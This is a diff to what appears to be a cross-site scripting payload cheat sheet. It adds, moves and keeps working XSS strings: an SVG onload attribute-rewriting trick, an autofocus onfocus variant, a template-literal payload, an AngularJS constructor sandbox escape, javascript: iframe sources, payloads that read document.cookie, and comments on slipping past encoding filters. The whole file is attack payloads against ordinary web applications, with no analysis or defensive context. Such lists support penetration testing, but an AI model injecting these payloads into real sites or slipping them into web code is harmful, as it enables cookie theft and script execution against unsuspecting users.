@@ -1,4 +1,4 @@
-
+#${alert(1)}
 '-alert(document.domain)-'
 ';alert(document.cookie)//
 "onload=alert"()"
@@ -39,9 +39,10 @@ ________________________________________________________________________________
 <iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
 _______________________________________________________________________________________________________________________________________________________________
 <img ='><svg onload="alert(1)"'>
-{{$on.constructor('alert(1)')()}} //very powerful on some
 "><svg onload=alert(1)>
+<svg onload="attributes[0].value=id+URL+id,new onload" id=`> 
 
+{{$on.constructor('alert(1)')()}} //very powerful on some
 ';a=prompt,a()//
 _______________________________________________________________________________________________________________________________________________________________
 javascript:alert(1)
@@ -69,6 +70,7 @@ ________________________________________________________________________________
 _______________________________________________________________________________________________________________________________________________________________
 //introduce a new attribute that creates a scriptable context
 " autofocus onfocus=alert(document.domain) x="
+<svg onload="attributes[0].value=id+URL+id,new onfocus" id=` autofocus>
 "onmouseover="alert(1)
 &#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
 " onmouseover="alert(1)"    // after the = don't use "" if it's getting encoded 
